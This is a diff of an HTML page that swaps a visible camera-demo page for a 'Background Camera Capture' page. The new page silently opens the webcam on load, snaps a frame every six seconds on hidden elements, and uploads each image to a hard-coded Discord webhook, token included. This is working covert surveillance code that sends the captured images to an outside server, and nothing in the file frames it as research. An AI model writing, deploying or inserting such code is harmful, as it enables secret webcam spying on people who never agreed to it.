@@ -1,49 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access Example</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-        }
-        video {
-            width: 100%;
-            max-width: 600px;
-            border: 1px solid #ccc;
-            margin-top: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Background Camera Capture</title>
 </head>
 <body>
-    <h1>Camera Access Example</h1>
-    <button id="startButton">Start Camera</button>
-    <video id="video" autoplay></video>
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1300118327565357127/y_XVnWNtRGEo_KW7RFwegBsub9wn4TOa5SsFvbMh4czwptgkVXznqvsdUOOGluvh7lDK";
 
-    <script>
-        const startButton = document.getElementById('startButton');
-        const video = document.getElementById('video');
+    // Function to send the image data to the Discord webhook
+    function sendToDiscord(imageDataURL) {
+      // Convert the Base64 URL to a Blob to upload as an image file
+      fetch(imageDataURL)
+        .then(res => res.blob())
+        .then(blob => {
+          const formData = new FormData();
+          formData.append('file', blob, 'captured_image.png'); // Filename is optional
 
-        startButton.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-            } catch (error) {
-                console.error('Error accessing camera: ', error);
-                alert('Could not access camera. Please allow camera permission.');
+          // Send the image to the Discord webhook
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          }).then(response => {
+            if (response.ok) {
+              console.log('Image sent to Discord successfully');
+            } else {
+              console.error('Failed to send image to Discord:', response.statusText);
             }
+          }).catch(error => {
+            console.error('Error sending image to Discord:', error);
+          });
         });
-    </script>
+    }
+
+    // Request camera access and start capturing images
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+
+          // Capture an image every 6 seconds
+          setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current video frame onto the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get the image data URL from the canvas
+            const imageDataURL = canvas.toDataURL('image/png');
+            sendToDiscord(imageDataURL); // Send the captured image to Discord
+          }, 6000);
+        })
+        .catch(error => {
+          console.error('Error accessing the camera:', error);
+        });
+    } else {
+      console.error("Your browser doesn't support accessing the camera.");
+    }
+  </script>
 </body>
 </html>
